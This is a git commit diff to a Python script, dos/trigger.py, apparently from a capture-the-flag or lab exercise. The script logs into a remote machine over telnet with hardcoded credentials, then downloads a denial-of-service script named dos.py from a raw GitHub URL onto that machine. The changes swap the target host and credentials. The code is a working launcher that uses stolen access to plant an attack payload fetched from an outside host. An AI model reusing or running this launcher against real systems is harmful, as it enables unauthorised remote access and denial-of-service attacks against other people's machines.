b960bea915c2508c4e331f022746ea96741431ce
abc <abc@126.com>
2018-09-07 15:56:18 +0800

    modi dos

--- dos/trigger.py
+++ dos/trigger.py
@@ -7,15 +7,17 @@ class Trigger(object):
 
     #def login(self,Host,username=b'root',passwd=b'root'):
     #def login(self,Host_attack,username=b'root',passwd=b'tee001'):
-    def login(self,Host_attack,username,passwd):
-        dev = telnetlib.Telnet(Host_attack,port=23)
+    #def login(self,Host_attack,username,passwd):
+    def login(self,Host,user_name,password):
+        #dev = telnetlib.Telnet(Host_attack,port=23)
+        dev = telnetlib.Telnet(Host,port=23)
         dev.set_debuglevel(2) #Debug mode
 
         dev.read_until(b'login:')
-        dev.write(username + b'\n')
+        dev.write(user_name + b'\n')
 
         dev.read_until(b'Password:')
-        dev.write(passwd + b'\n')
+        dev.write(password + b'\n')
         dev.read_until(b'$')
         return dev
 
@@ -46,13 +48,18 @@ class Trigger(object):
 if __name__ == '__main__':
     #Host=b'192.168.59.146'
     Host_ctrled=b'153.0.0.181'
-    Host_attack=b'153.0.0.171'
     username = b'ctf'
     passwd = b'test1234'
+
+    Host_attack=b'153.0.0.171'
+    user = b'ctf'
+    pawd = b'ctff1234'
+
     #path = b'https://github.com/bl201809/bllist/tree/master/20180907/dos.py'
-    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/20180907/dos.py'
+    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'
     hack = Trigger()
-    dev = hack.login(Host_ctrled,username,passwd)
+    #dev = hack.login(Host_ctrled,username,passwd)
+    dev = hack.login(Host_attack,user,pawd)
     if not hack.checkIN(dev):
         hack.dosDownLoad(dev,path)
     time.sleep(2)
